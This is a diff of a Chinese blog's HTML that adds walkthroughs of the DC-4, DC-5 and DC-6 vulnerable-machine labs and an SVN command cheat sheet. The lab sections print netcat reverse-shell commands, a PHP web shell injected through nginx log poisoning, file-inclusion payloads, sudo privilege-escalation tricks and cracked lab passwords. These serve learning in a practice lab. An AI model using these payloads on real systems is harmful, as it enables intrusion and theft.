+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graham GSo7isUM1D4</span><br></pre></td></tr></table></figure>
+<p>使用ssh登录新用户查看权限<br>发现可以执行&#x2F;home&#x2F;jens&#x2F;backups.sh脚本，查看脚本权限。<br>发现脚本属于jens，同组用户拥有写权限，而用id命令发现为同组用户，根据这些情报就可以切换用户为jens。<br><img src="/img/DC-6/image-4.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.193.128 10086&quot; &gt;&gt; backups.sh </span><br><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看jens发现可以执行&#x2F;usr&#x2F;bin&#x2F;nmap，而该指令有漏洞，可以提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch root_shell.sh</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; root_shell.sh</span><br><span class="line">sudo nmap --script=root_shell.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-5.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>存在命令行输入漏洞，可以获取反弹shell。</li>
+<li>每日清单里存在帐号密码，可以进行横向渗透。</li>
+<li>存在脚本，同组用户可以写与执行，且可以sudo无密码执行，可以进行横向渗透。</li>
+<li>nmap可以sudo无密码执行，且该脚本存在权限提升漏洞。</li>
+</ol>
+
       
 
       
@@ -494,7 +618,34 @@
 <li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>获取主机服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.138</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image.png" alt="alt text"><br>发现存在http服务，登录网站试试。</p>
+<p><img src="/img/DC-5/image-1.png" alt="alt text"><br>发现底下的数字不断发生变化，猜测存在文件包含漏洞。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ol>
+<li><p>文件包含漏洞利用<br>首先对参数名进行暴力破解，获取文件包含漏洞的参数名。<br><img src="/img/DC-5/image-2.png" alt="alt text"><br>发现file参数响应长度明显不同，可以知道参数名为file<br><img src="/img/DC-5/image-3.png" alt="alt text"><br>接下来暴力破解包含的文件名，看看可以获取哪些信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=../etc/passwd</span><br><span class="line">?page=file:///etc/passwd</span><br><span class="line">?home=main.cgi</span><br><span class="line">?page=http://xxx/1.php</span><br><span class="line">http://xxx/../../../file.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-4.png" alt="alt text"><br>爆破出密码文件，再一次验证文件包含漏洞。</p>
+</li>
+<li><p>利用文件包含漏洞获取反弹shell<br>nginx日志的默认日志路徑为&#x2F;var&#x2F;log&#x2F;nginx&#x2F;,一般nginx的日志都有access.log和error.log文件，可以访问试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.193.138/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-5.png" alt="alt text"><br>发现里面包含http请求记录，可以试试一句话木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改浏览器参数符号会被转化，使用brup修改参数。</span><br><span class="line">GET /thankyou.php?file=&lt;?php phpinfo(); ?&gt; HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-6.png" alt="alt text"><br>发现成功注入，接下来使用一句话木马，或者直接执行命令连接，获取反弹shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 直接连接</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;nc -e /bin/bash 192.168.193.128 10086&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># 使用蚁剑工具连接</span><br><span class="line">&lt;?php eval(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用find查看是否有可以利用的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-7.png" alt="alt text"><br>发现screen-4.5.0命令，看看是否可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line">searchsploit -p linux/local/41154.sh</span><br><span class="line"># 查看脚本文件格式</span><br><span class="line">cat -A a.sh </span><br><span class="line"># 每个操作系统以字符表示结尾的时候是不同的，查看脚本文件若每行结尾为 ^M</span><br><span class="line"># 则需要使用命令 转换</span><br><span class="line">dos2unix a.sh </span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-5/image-8.png" alt="alt text"><br>发现这个脚本存在权限提升漏洞，上传攻击脚本到服务器，由于&#x2F;tmp文件夹限制最小，一般上传到这个文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 打开kali linux ssh服务</span><br><span class="line">service ssh restart</span><br><span class="line"></span><br><span class="line"># 传输文件</span><br><span class="line">scp root@192.168.193.128:/tmp/a.sh /tmp/a.sh</span><br><span class="line">scp root@192.168.193.128:/tmp/rootshell /tmp/rootshell</span><br><span class="line">scp root@192.168.193.128:/tmp/libhax.so /tmp/libhax.so</span><br><span class="line"></span><br><span class="line">scp root@192.168.193.128:/tmp/rootshell.c /tmp/rootshell.c</span><br><span class="line">scp root@192.168.193.128:/tmp/libhax.c /tmp/libhax.c</span><br></pre></td></tr></table></figure>
+<p>最后一步执行脚本报错，不知道什么貌似gcc版本不对。<br><img src="/img/DC-5/image-9.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>网站存在文件包含漏洞，同时nginx会将访问记录存储在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里面。</li>
+<li>screen 4.5.0存在本地权限提升漏洞。</li>
+</ol>
+
       
 
       
@@ -573,7 +724,36 @@
 <li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><ol>
+<li>获取主机服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24 </span><br><span class="line">nmap -A -T4 -p- 192.168.193.137</span><br></pre></td></tr></table></figure>
+<img src="/img/DC-4/image0.png" alt="alt text"><br>提供ssh服务（端口22），提供http服务（端口80）。</li>
+</ol>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>发现提供http服务界面为登录界面，密码暴力破解。</p>
+<ol>
+<li>brup抓包，使用&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst路径下文件，进行暴力破解。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">happy</span><br></pre></td></tr></table></figure></li>
+<li>利用命令行注入漏洞获取反弹shell<br><img src="/img/DC-4/image-0.png" alt="alt text"><br>可以知道这是一个典型命令行注入界面，使用brup修改包的内容，执行反弹shell命令即可。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改传送内容</span><br><span class="line">nc+-e+/bin/bash+192.168.193.128+10086</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="/img/DC-4/image.png" alt="alt text"><br>发现jim用户留下了密码本，可以再次进行密码破解。<br>传输文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.193.128 10085 &lt; old-passwords.bak</span><br><span class="line">nc -lvvp 10085 &gt; DC-4-P.txt</span><br></pre></td></tr></table></figure>
+
+<p>根据home目录获取用户名，再次进行密码破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC-4-U.txt -P DC-4-P.txt ssh://192.168.193.137 -t 64</span><br><span class="line">jim jibril04</span><br></pre></td></tr></table></figure>
+
+<p>在邮件下查看到charles的密码<br><img src="/img/DC-4/image-1.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+
+<p>查看charles权限<br><img src="/img/DC-4/image-2.png" alt="alt text"></p>
+<p>发现可以执行&#x2F;usr&#x2F;bin&#x2F;teehee，查看teehee用法<br><img src="/img/DC-4/image-3.png" alt="alt text"></p>
+<p>发现可以给任意文件添加任意内容，这里将charles提权为root用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teehee -a /etc/sudoers</span><br><span class="line">charles ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-4/image-4.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>网站没有做密码暴力破解应对措施。</li>
+<li>网站存在命令行注入漏洞。</li>
+<li>用户保存密码本，且该密码本允许任意用户查看。</li>
+<li>用户可以sudo执行命令，无密码向任意文件追加任意内容。</li>
+</ol>
+
       
 
       
@@ -926,7 +1106,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <table>
+        <ul>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a></li>
+<li><a href="#%E7%A4%BA%E4%BE%8B%E8%AF%B4%E6%98%8E">示例说明</a></li>
+<li><a href="#%E8%BF%9B%E9%98%B6">进阶</a><ul>
+<li><a href="#%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E5%B7%B2%E7%BB%8F%E5%88%A0%E9%99%A4%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0svn%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%9C%AC%E5%9C%B0%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6svn%E4%B9%9F%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6">批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><table>
 <thead>
 <tr>
 <th align="left">指令</th>
@@ -954,7 +1142,8 @@
 <td align="left">删除文件或目录。</td>
 </tr>
 </tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">1. svn checkout path</span><br><span class="line">path 是服务器上的目录。</span><br><span class="line">例如：svn checkout svn://192.168.1.1/pro/domain</span><br><span class="line">简写：svn co</span><br><span class="line"></span><br><span class="line">1. svn add file</span><br><span class="line">file是某个文件或者某个目录，如果添加所有的文件则用点“.”表示。</span><br><span class="line">例如：svn add test.php</span><br><span class="line">svn add *.php（添加当前目录下所有的php文件）</span><br><span class="line">svn add . （表示添加所有文件）</span><br><span class="line"></span><br><span class="line">1. svn commit</span><br><span class="line">提交文件到服务器。</span><br><span class="line">例如：svn commit -m “add test file for my test”</span><br><span class="line">简写：svn  ci</span><br><span class="line">一般步骤：</span><br><span class="line">step-1：svn update</span><br><span class="line">step-2：svn add file、svn delete file</span><br><span class="line">step-3：svn commit -m “提交文件到远程服务器”</span><br><span class="line"></span><br><span class="line">1. svn update</span><br><span class="line">更新版本命令。</span><br><span class="line">svn update -r m path</span><br><span class="line">例如：</span><br><span class="line">(1) svn update 后面没有目录，默认更新当前目录及子目录的所有文件到最新版本。</span><br><span class="line">(2) svn update -r 200 test.php （将版本库中的文件test.php还原到版本200）</span><br><span class="line">简写：svn up</span><br><span class="line">update命令还可以进行文件恢复。 </span><br><span class="line">（1）不小心写错了很多东西，想撤销所写的东西（已经把修改提交到服务器）svn update -r 版本号 </span><br><span class="line">（2）不小心删错了文件，想把文件恢复回来（已经把删除提交到服务器）svn update -r 版本号</span><br><span class="line"></span><br><span class="line">1. svn status</span><br><span class="line">svn status -v path</span><br><span class="line">svn status path</span><br><span class="line">简写：svn st</span><br><span class="line"></span><br><span class="line">文件状态描述</span><br><span class="line">‘ ‘ 没有修改</span><br><span class="line">I 被忽略</span><br><span class="line">R 被替换</span><br><span class="line">~ 受控文件被其他文件阻隔</span><br><span class="line"></span><br><span class="line">&quot;!&quot;表示：本地执行了&quot;rm -rf&quot;，但是未执行&quot;svn del&quot;的状态。</span><br><span class="line">&quot;?&quot;表示：本地新加了一个文件，但是未执行&quot;svn add&quot;的状态。</span><br><span class="line">&quot;A&quot;表示：本地新加了一个文件，且执行了&quot;svn add&quot;的状态。</span><br><span class="line">&quot;X&quot;表示：执行了&quot;svn external&quot;的状态。</span><br><span class="line">&quot;D&quot;表示：本地执行了&quot;rm -rf&quot;，且执行了&quot;svn del&quot;的状态。</span><br><span class="line">&quot;M&quot;表示：本地修改了该文件时的状态。</span><br><span class="line">&quot;C&quot;表示：冲突状态，是重点关注状态之一。</span><br><span class="line"></span><br><span class="line">7. svn delete</span><br><span class="line">删除文件。</span><br><span class="line">svn delete path -m &quot;delete test file&quot;</span><br><span class="line">例如：</span><br><span class="line">1、删除远程服务器文件</span><br><span class="line">svn delete svn://192.168.1.1/pro/domain/test.php  -m &quot;delete test file&quot;</span><br><span class="line">2、删除本地文件，然后提交</span><br><span class="line">svn delete test.php， 然后再svn ci -m &quot;delete test file&quot;，推荐使用这种</span><br><span class="line">简写：svn (del, remove, rm)</span><br><span class="line"></span><br><span class="line">8. svn log</span><br><span class="line">查看日志。</span><br><span class="line">查看一段日期的日志</span><br><span class="line">svn log -r &#123;2018-07-03&#125;:&#123;2018-07-09&#125;</span><br><span class="line"></span><br><span class="line">9. 添加忽略文件</span><br><span class="line"># 创建一个名为.svnignore的文件，并添加.git/到文件中</span><br><span class="line">echo &quot;.git/&quot; &gt; .svnignore</span><br><span class="line"></span><br><span class="line"># 将.svnignore文件添加到svn:ignore属性中</span><br><span class="line">svn propset svn:ignore -F .svnignore .</span><br><span class="line"></span><br><span class="line"># 确认.svnignore文件被添加到忽略列表中</span><br><span class="line">svn status</span><br><span class="line"></span><br><span class="line"># 如果确认忽略列表正确，执行svn add和svn commit来上传文件夹到SVN</span><br><span class="line">svn add .</span><br><span class="line">svn commit -m &quot;Adding directory to SVN repository&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">1. svn checkout path</span><br><span class="line">path 是服务器上的目录。</span><br><span class="line">例如：svn checkout svn://192.168.1.1/pro/domain</span><br><span class="line">简写：svn co</span><br><span class="line"></span><br><span class="line">1. svn add file</span><br><span class="line">file是某个文件或者某个目录，如果添加所有的文件则用点“.”表示。</span><br><span class="line">例如：svn add test.php</span><br><span class="line">svn add *.php（添加当前目录下所有的php文件）</span><br><span class="line">svn add . （表示添加所有文件）</span><br><span class="line"></span><br><span class="line">1. svn commit</span><br><span class="line">提交文件到服务器。</span><br><span class="line">例如：svn commit -m “add test file for my test”</span><br><span class="line">简写：svn  ci</span><br><span class="line">一般步骤：</span><br><span class="line">step-1：svn update</span><br><span class="line">step-2：svn add file、svn delete file</span><br><span class="line">step-3：svn commit -m “提交文件到远程服务器”</span><br><span class="line"></span><br><span class="line">1. svn update</span><br><span class="line">更新版本命令。</span><br><span class="line">svn update -r m path</span><br><span class="line">例如：</span><br><span class="line">(1) svn update 后面没有目录，默认更新当前目录及子目录的所有文件到最新版本。</span><br><span class="line">(2) svn update -r 200 test.php （将版本库中的文件test.php还原到版本200）</span><br><span class="line">简写：svn up</span><br><span class="line">update命令还可以进行文件恢复。 </span><br><span class="line">（1）不小心写错了很多东西，想撤销所写的东西（已经把修改提交到服务器）svn update -r 版本号 </span><br><span class="line">（2）不小心删错了文件，想把文件恢复回来（已经把删除提交到服务器）svn update -r 版本号</span><br><span class="line"></span><br><span class="line">1. svn status</span><br><span class="line">svn status -v path</span><br><span class="line">svn status path</span><br><span class="line">简写：svn st</span><br><span class="line"></span><br><span class="line">文件状态描述</span><br><span class="line">‘ ‘ 没有修改</span><br><span class="line">I 被忽略</span><br><span class="line">R 被替换</span><br><span class="line">~ 受控文件被其他文件阻隔</span><br><span class="line"></span><br><span class="line">&quot;!&quot;表示：本地执行了&quot;rm -rf&quot;，但是未执行&quot;svn del&quot;的状态。</span><br><span class="line">&quot;?&quot;表示：本地新加了一个文件，但是未执行&quot;svn add&quot;的状态。</span><br><span class="line">&quot;A&quot;表示：本地新加了一个文件，且执行了&quot;svn add&quot;的状态。</span><br><span class="line">&quot;X&quot;表示：执行了&quot;svn external&quot;的状态。</span><br><span class="line">&quot;D&quot;表示：本地执行了&quot;rm -rf&quot;，且执行了&quot;svn del&quot;的状态。</span><br><span class="line">&quot;M&quot;表示：本地修改了该文件时的状态。</span><br><span class="line">&quot;C&quot;表示：冲突状态，是重点关注状态之一。</span><br><span class="line"></span><br><span class="line">7. svn delete</span><br><span class="line">删除文件。</span><br><span class="line">svn delete path -m &quot;delete test file&quot;</span><br><span class="line">例如：</span><br><span class="line">1、删除远程服务器文件</span><br><span class="line">svn delete svn://192.168.1.1/pro/domain/test.php  -m &quot;delete test file&quot;</span><br><span class="line">2、删除本地文件，然后提交</span><br><span class="line">svn delete test.php， 然后再svn ci -m &quot;delete test file&quot;，推荐使用这种</span><br><span class="line">简写：svn (del, remove, rm)</span><br><span class="line"></span><br><span class="line">8. svn log</span><br><span class="line">查看日志。</span><br><span class="line">查看一段日期的日志</span><br><span class="line">svn log -r &#123;2018-07-03&#125;:&#123;2018-07-09&#125;</span><br><span class="line"></span><br><span class="line">9. 添加忽略文件</span><br><span class="line"># 创建一个名为.svnignore的文件，并添加.git/到文件中</span><br><span class="line">echo &quot;.git/&quot; &gt; .svnignore</span><br><span class="line"></span><br><span class="line"># 将.svnignore文件添加到svn:ignore属性中</span><br><span class="line">svn propset svn:ignore -F .svnignore .</span><br><span class="line"></span><br><span class="line"># 确认.svnignore文件被添加到忽略列表中</span><br><span class="line">svn status</span><br><span class="line"></span><br><span class="line"># 如果确认忽略列表正确，执行svn add和svn commit来上传文件夹到SVN</span><br><span class="line">svn add .</span><br><span class="line">svn commit -m &quot;Adding directory to SVN repository&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）"><a href="#批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）" class="headerlink" title="批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）"></a>批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn status | grep &#x27;!&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | xargs svn delete</span><br></pre></td></tr></table></figure>
       
 
       
